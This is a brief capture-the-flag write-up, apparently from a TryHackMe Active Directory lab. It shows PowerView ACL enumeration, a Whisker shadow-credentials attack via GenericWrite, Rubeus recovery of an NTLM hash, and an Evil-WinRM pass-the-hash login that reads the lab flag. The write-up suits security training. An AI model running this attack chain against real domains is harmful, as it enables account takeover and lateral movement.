```powershell
. .\PowerView.ps1
Find-InterestingDomainAcl -ResolveGuids | Where-Object {$_.IdentityReferenceName -eq "hr"} | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights
```


IdentityReferenceName ObjectDN                                                    ActiveDirectoryRights
--------------------- --------                                                    ---------------------
hr                    CN=vansprinkles,CN=Users,DC=AOC,DC=local ListChildren, ReadProperty, GenericWrite


hr user has GenericWrite on vansprinkles.

```powershell
.\Whisker.exe add /target:vansprinkles
```

Run generated Rubeus.exe command


[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 03E805D8A8C5AA435FB48832DAD620E3

Use Evil-WinRM to login as vansprinkles user

```bash
evil-winrm -i 10.10.113.138 -u vansprinkles -H 03E805D8A8C5AA435FB48832DAD620E3
```

# Hash of vulnerable user
03E805D8A8C5AA435FB48832DAD620E3

# Contents of flag.txt on Administrator's Desktop
```powershell
cd C:\Users\Administrator\Desktop
type flag.txt
```
THM{XMAS_IS_SAFE}
